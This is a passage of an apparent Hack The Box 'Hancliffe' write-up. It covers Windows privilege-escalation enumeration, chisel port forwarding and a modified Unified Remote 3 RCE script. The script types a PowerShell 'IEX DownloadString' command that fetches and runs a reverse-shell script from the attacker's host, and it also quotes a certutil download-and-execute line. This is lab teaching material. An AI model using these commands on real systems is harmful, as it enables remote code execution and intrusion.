<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>@SET PGDATA<span class="op">=</span>C<span class="op">:</span>\Program Files\PostgreSQL\<span class="dv">9.6</span>\<span class="kw">data</span></span>
<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a>@SET PGDATABASE<span class="op">=</span>postgres</span>
<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a>@SET PGUSER<span class="op">=</span>postgres</span>
<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a>@SET PGPORT<span class="op">=</span><span class="dv">5432</span></span>
<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a>@SET PGLOCALEDIR<span class="op">=</span>C<span class="op">:</span>\Program Files\PostgreSQL\<span class="dv">9.6</span>\share\locale</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>.. and running <code>netstat</code> we see there are a lot more services running locally:</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="fu">PS</span> C<span class="op">:</span>\<span class="op">&gt;</span> netstat <span class="op">-</span>ant</span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>Active Connections</span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>  Proto  Local Address          Foreign Address        State           PID</span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>  TCP    <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">80</span>             <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">0</span>              LISTENING       <span class="dv">7100</span></span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>  TCP    <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">135</span>            <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">0</span>              LISTENING       <span class="dv">896</span></span>
<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a>  TCP    <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">445</span>            <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">0</span>              LISTENING       <span class="dv">4</span></span>
<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>  TCP    <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">5040</span>           <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">0</span>              LISTENING       <span class="dv">552</span></span>
<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>  TCP    <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">5432</span>           <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">0</span>              LISTENING       <span class="dv">3284</span></span>
<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a>  TCP    <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">5985</span>           <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">0</span>              LISTENING       <span class="dv">4</span></span>
<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a>  TCP    <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">8000</span>           <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">0</span>              LISTENING       <span class="dv">7100</span></span>
<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a>  TCP    <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">9510</span>           <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">0</span>              LISTENING       <span class="dv">4132</span></span>
<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a>  TCP    <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">9512</span>           <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">0</span>              LISTENING       <span class="dv">4132</span></span>
<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a>  TCP    <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">9952</span>           <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">0</span>              LISTENING       <span class="dv">2328</span></span>
<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a>  TCP    <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">9999</span>           <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">0</span>              LISTENING       <span class="dv">2848</span></span>
<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a>  TCP    <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">47001</span>          <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">0</span>              LISTENING       <span class="dv">4</span></span>
<span id="cb10-16"><a href="#cb10-16" aria-hidden="true" tabindex="-1"></a>  TCP    <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">49664</span>          <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">0</span>              LISTENING       <span class="dv">676</span></span>
<span id="cb10-17"><a href="#cb10-17" aria-hidden="true" tabindex="-1"></a>  TCP    <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">49665</span>          <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">0</span>              LISTENING       <span class="dv">516</span></span>
<span id="cb10-18"><a href="#cb10-18" aria-hidden="true" tabindex="-1"></a>  TCP    <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">49666</span>          <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">0</span>              LISTENING       <span class="dv">1092</span></span>
<span id="cb10-19"><a href="#cb10-19" aria-hidden="true" tabindex="-1"></a>  TCP    <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">49667</span>          <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">0</span>              LISTENING       <span class="dv">1588</span></span>
<span id="cb10-20"><a href="#cb10-20" aria-hidden="true" tabindex="-1"></a>  TCP    <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">49668</span>          <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span><span class="op">:</span><span class="dv">0</span>              LISTENING       <span class="dv">656</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Uploading winPEAS.exe to <code>C:\Windows\Temp</code> gives nothing, probably defender or applocker blocking it. But <code>C:\Windows\Tasks</code> works just fine.</p>
<div class="sourceCode" id="cb11"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="fu">PS</span> C<span class="op">:</span>\Windows\Tasks<span class="op">&gt;</span> <span class="fu">copy</span> \\<span class="dv">10.10</span><span class="op">.</span><span class="dv">14.8</span>\share\wp<span class="op">.</span><span class="fu">exe</span> <span class="op">.</span></span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="fu">PS</span> C<span class="op">:</span>\Windows\Tasks<span class="op">&gt;</span> <span class="fu">dir</span></span>
<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>Mode                 LastWriteTime         Length Name</span>
<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="op">----</span>                 <span class="op">-------------</span>         <span class="op">------</span> <span class="op">----</span>                             </span>
<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="op">-</span>a----        <span class="dv">12</span><span class="op">/</span><span class="dv">14</span><span class="op">/</span><span class="dv">2021</span>   <span class="dv">1</span><span class="op">:</span><span class="dv">29</span> AM        <span class="dv">1927680</span> wp<span class="op">.</span><span class="fu">exe</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Interesting output from WinPEAS:</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a>  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             <span class="cf">Process</span> ID      <span class="cf">Process</span> Name</span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>  TCP        <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">80</span>            <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">0</span>               Listening         <span class="dv">7100</span>            C<span class="op">:</span>\nginx\nginx<span class="op">.</span><span class="fu">exe</span></span>
<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>  TCP        <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">135</span>           <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">0</span>               Listening         <span class="dv">896</span>             svchost</span>
<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>  TCP        <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">445</span>           <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">0</span>               Listening         <span class="dv">4</span>               System</span>
<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>  TCP        <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">5040</span>          <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">0</span>               Listening         <span class="dv">552</span>             svchost</span>
<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>  TCP        <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">5432</span>          <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">0</span>               Listening         <span class="dv">3284</span>            postgres</span>
<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a>  TCP        <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">5985</span>          <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">0</span>               Listening         <span class="dv">4</span>               System</span>
<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a>  TCP        <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">8000</span>          <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">0</span>               Listening         <span class="dv">7100</span>            C<span class="op">:</span>\nginx\nginx<span class="op">.</span><span class="fu">exe</span></span>
<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>  TCP        <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">9014</span>          <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">0</span>               Listening         <span class="dv">8116</span>            MyFirstApp</span>
<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a>  TCP        <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">9510</span>          <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">0</span>               Listening         <span class="dv">4132</span>            RemoteServerWin</span>
<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a>  TCP        <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">9512</span>          <span class="dv">0.0</span><span class="op">.</span><span class="dv">0.0</span>               <span class="dv">0</span>               Listening         <span class="dv">4132</span>            RemoteServerWin</span>
<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a><span class="op">------------------------</span></span>
<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a>    RemoteServerWin<span class="op">(</span>Unified Intents AB <span class="op">-</span> RemoteServerWin<span class="op">)[</span>C<span class="op">:</span><span class="at">\</span>Program Files <span class="op">(</span>x86<span class="op">)</span><span class="at">\</span>Unified Remote <span class="dv">3</span><span class="at">\</span>RemoteServerWin<span class="op">.</span><span class="fu">exe</span><span class="op">]</span> <span class="op">-</span> Autoload <span class="op">-</span> No quotes and Space detected</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
<section id="step-4" class="level3">
<h3 class="anchored" data-anchor-id="step-4">Step 4</h3>
<p>Going through all output we find that port 9510 and 9512 (Unified Remote 3) sounds interesting.</p>
<blockquote class="blockquote">
<p>“Unified Remote is a <strong>software that lets you use your mobile phone</strong> (Android, iOS, or Windows Phone) to control every aspect of your computer: from handling your keyboard and mouse to managing files on your hard drive.”</p>
</blockquote>
<div class="sourceCode" id="cb13"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/hancliffe]</span></span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> searchsploit <span class="st">"unified remote 3"</span>                                                                                                                       1 ⨯</span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="ex">----------------------------------------------------------------------------------------------------------------------------</span> <span class="at">---------------------------------</span></span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a> <span class="ex">Exploit</span> Title                                                                                                              <span class="kw">|</span>  <span class="ex">Path</span></span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="ex">----------------------------------------------------------------------------------------------------------------------------</span> <span class="at">---------------------------------</span></span>
<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Unified</span> Remote 3.9.0.2463 <span class="at">-</span> Remote Code Execution                                                                           <span class="kw">|</span> <span class="ex">windows/remote/49587.py</span></span>
<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a><span class="ex">----------------------------------------------------------------------------------------------------------------------------</span> <span class="at">---------------------------------</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>There is a RCE vuln that sounds interesting. Use <code>chisel</code> to port forward, so we can interact with the port. I had <strong>A LOT</strong> of problems getting this to work, probably because the default embedded version of chisel (in Kali) did not match my windows binary version.</p>
<p>So smartest thing here is to download and compile new executables for both exe and elf.</p>
<div class="sourceCode" id="cb14"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> sudo git clone https://github.com/jpillora/chisel.git</span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> cd chisel</span>
<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> sudo GOOS=windows GOARCH=amd64 go build <span class="at">-ldflags</span><span class="op">=</span><span class="st">"-s -w"</span> .</span>
<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ls <span class="at">-al</span> chisel.exe    </span>
<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a><span class="ex">-rwxr-xr-x</span>  1 root root 8556032 Jan  5 13:29 chisel.exe</span>
<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> sudo go build <span class="at">-ldflags</span><span class="op">=</span><span class="st">"-s -w"</span> .</span>
<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ls <span class="at">-al</span> chisel     </span>
<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a><span class="ex">-rwxr-xr-x</span> 1 root root 8392704 Jan  5 13:31 chisel</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb15"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="fu">PS</span> C<span class="op">:</span>\Windows\Tasks<span class="op">&gt;</span> <span class="fu">copy</span> \\<span class="dv">10.10</span><span class="op">.</span><span class="dv">14.3</span>\share\chisel<span class="op">.</span><span class="fu">exe</span> <span class="op">.</span></span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="fu">PS</span> C<span class="op">:</span>\Windows\Tasks<span class="op">&gt;</span> <span class="fu">dir</span></span>
<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>Mode                 LastWriteTime         Length Name                                                                 </span>
<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="op">----</span>                 <span class="op">-------------</span>         <span class="op">------</span> <span class="op">----</span>                                                                 </span>
<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a><span class="op">-</span>a----        <span class="dv">12</span><span class="op">/</span><span class="dv">14</span><span class="op">/</span><span class="dv">2021</span>   <span class="dv">2</span><span class="op">:</span><span class="dv">29</span> AM        <span class="dv">8548352</span> chisel<span class="op">.</span><span class="fu">exe</span>                                                           </span>
<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>┌──<span class="op">(</span>void㉿void<span class="op">)-[/</span>opt<span class="op">/</span>chisel<span class="op">]</span></span>
<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>└─$ <span class="op">./</span>chisel server <span class="op">-</span>p <span class="dv">9000</span> <span class="op">--</span>reverse</span>
<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a><span class="fu">PS</span> C<span class="op">:</span>\Windows\Tasks<span class="op">&gt;</span> <span class="op">.</span>\chisel<span class="op">.</span><span class="fu">exe</span> client <span class="dv">10.10</span><span class="op">.</span><span class="dv">14.3</span><span class="op">:</span><span class="dv">9000</span> R<span class="op">:</span><span class="dv">9512</span><span class="op">:</span>localhost<span class="op">:</span><span class="dv">9512</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Reading through the Unified Remote RCE script we find that it wants three input arguments, and we need to host a HTTP server to download the payload.</p>
<div class="sourceCode" id="cb16"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="co"># User Specified arguments</span></span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="cf">try</span>:</span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>    rhost <span class="op">=</span> sys.argv[<span class="dv">1</span>]</span>
<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a>    lhost <span class="op">=</span> sys.argv[<span class="dv">2</span>]</span>
<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">=</span> sys.argv[<span class="dv">3</span>]</span>
<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a><span class="cf">except</span>:</span>
<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a>[... snip ...]</span>
<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"[+] Opening CMD"</span>)</span>
<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a>    SendString(<span class="st">"cmd.exe"</span>, rhost)</span>
<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a>    sleep(<span class="fl">0.3</span>)</span>
<span id="cb16-13"><a href="#cb16-13" aria-hidden="true" tabindex="-1"></a>    SendReturn()</span>
<span id="cb16-14"><a href="#cb16-14" aria-hidden="true" tabindex="-1"></a>    sleep(<span class="fl">0.3</span>)</span>
<span id="cb16-15"><a href="#cb16-15" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"[+] *Super Fast Hacker Typing*"</span>)</span>
<span id="cb16-16"><a href="#cb16-16" aria-hidden="true" tabindex="-1"></a>    SendString(<span class="st">"certutil.exe -f -urlcache http://"</span> <span class="op">+</span> lhost <span class="op">+</span> <span class="st">"/"</span> <span class="op">+</span> payload <span class="op">+</span> <span class="st">" C:</span><span class="ch">\\</span><span class="st">Windows</span><span class="ch">\\</span><span class="st">Temp</span><span class="ch">\\</span><span class="st">"</span> <span class="op">+</span> payload, rhost) <span class="co"># Retrieve HTTP hosted payload</span></span>
<span id="cb16-17"><a href="#cb16-17" aria-hidden="true" tabindex="-1"></a>    sleep(<span class="fl">0.3</span>)</span>
<span id="cb16-18"><a href="#cb16-18" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"[+] Downloading Payload"</span>)</span>
<span id="cb16-19"><a href="#cb16-19" aria-hidden="true" tabindex="-1"></a>    SendReturn()</span>
<span id="cb16-20"><a href="#cb16-20" aria-hidden="true" tabindex="-1"></a>    sleep(<span class="dv">3</span>)</span>
<span id="cb16-21"><a href="#cb16-21" aria-hidden="true" tabindex="-1"></a>    SendString(<span class="st">"C:</span><span class="ch">\\</span><span class="st">Windows</span><span class="ch">\\</span><span class="st">Temp</span><span class="ch">\\</span><span class="st">"</span> <span class="op">+</span> payload, rhost) <span class="co"># Execute Payload</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>I struggled with this part for a while but in the end modified my script to look like this:</p>
<div class="sourceCode" id="cb17"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="co"># User Specified arguments</span></span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>try<span class="op">:</span></span>
<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>    rhost <span class="op">=</span> sys<span class="op">.</span><span class="fu">argv</span><span class="op">[</span><span class="dv">1</span><span class="op">]</span></span>
<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a>    lhost <span class="op">=</span> sys<span class="op">.</span><span class="fu">argv</span><span class="op">[</span><span class="dv">2</span><span class="op">]</span></span>
<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a>except<span class="op">:</span></span>
<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a><span class="op">[...</span> snip <span class="op">...]</span></span>
<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a>    print<span class="op">(</span><span class="st">"[+] Opening CMD"</span><span class="op">)</span></span>
<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a>    SendString<span class="op">(</span><span class="st">"powershell.exe"</span><span class="op">,</span> rhost<span class="op">)</span></span>
<span id="cb17-12"><a href="#cb17-12" aria-hidden="true" tabindex="-1"></a>    <span class="fu">sleep</span><span class="op">(</span><span class="dv">0.3</span><span class="op">)</span></span>
<span id="cb17-13"><a href="#cb17-13" aria-hidden="true" tabindex="-1"></a>    SendReturn<span class="op">()</span></span>
<span id="cb17-14"><a href="#cb17-14" aria-hidden="true" tabindex="-1"></a>    print<span class="op">(</span><span class="st">"[+] Executing Payload"</span><span class="op">)</span></span>
<span id="cb17-15"><a href="#cb17-15" aria-hidden="true" tabindex="-1"></a>    <span class="fu">sleep</span><span class="op">(</span><span class="dv">0.3</span><span class="op">)</span></span>
<span id="cb17-16"><a href="#cb17-16" aria-hidden="true" tabindex="-1"></a>    SendString<span class="op">(</span><span class="st">"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/Invoke-PowerShellTcp.ps1')"</span><span class="op">,</span> rhost<span class="op">)</span> <span class="co"># Execute Payload</span></span>
<span id="cb17-17"><a href="#cb17-17" aria-hidden="true" tabindex="-1"></a>    <span class="fu">sleep</span><span class="op">(</span><span class="dv">0.3</span><span class="op">)</span></span>
<span id="cb17-18"><a href="#cb17-18" aria-hidden="true" tabindex="-1"></a>    SendReturn<span class="op">()</span></span>
<span id="cb17-19"><a href="#cb17-19" aria-hidden="true" tabindex="-1"></a>    <span class="fu">sleep</span><span class="op">(</span><span class="dv">5</span><span class="op">)</span></span>
<span id="cb17-20"><a href="#cb17-20" aria-hidden="true" tabindex="-1"></a>    print<span class="op">(</span><span class="st">"[+] Done! Check listener?"</span><span class="op">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Setup a HTTP-sever, listener and execute the script</p>
<div class="sourceCode" id="cb18"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/hancliffe]</span></span>
<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> python expl.py 127.0.0.1 10.10.14.3</span>
<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Connecting to target...</span>
<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Popping Start Menu</span>
<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Opening CMD</span>
<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Executing Payload</span>
<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Done! Check listener<span class="pp">?</span></span>
<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/hancliffe]</span></span>
<span id="cb18-10"><a href="#cb18-10" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> python3 <span class="at">-m</span> http.server 8080</span>
<span id="cb18-11"><a href="#cb18-11" aria-hidden="true" tabindex="-1"></a><span class="ex">Serving</span> HTTP on 0.0.0.0 port 8080 <span class="er">(</span><span class="ex">http://0.0.0.0:8080/</span><span class="kw">)</span> <span class="ex">...</span></span>
<span id="cb18-12"><a href="#cb18-12" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.11.115</span> <span class="at">-</span> <span class="at">-</span> [05/Jan/2022 15:25:24] <span class="st">"GET /invoke-powershelltcp.ps1 HTTP/1.1"</span> 200 <span class="at">-</span></span>
<span id="cb18-13"><a href="#cb18-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-14"><a href="#cb18-14" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/hancliffe]</span></span>
<span id="cb18-15"><a href="#cb18-15" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> nc <span class="at">-lvnp</span> 4499                                       </span>
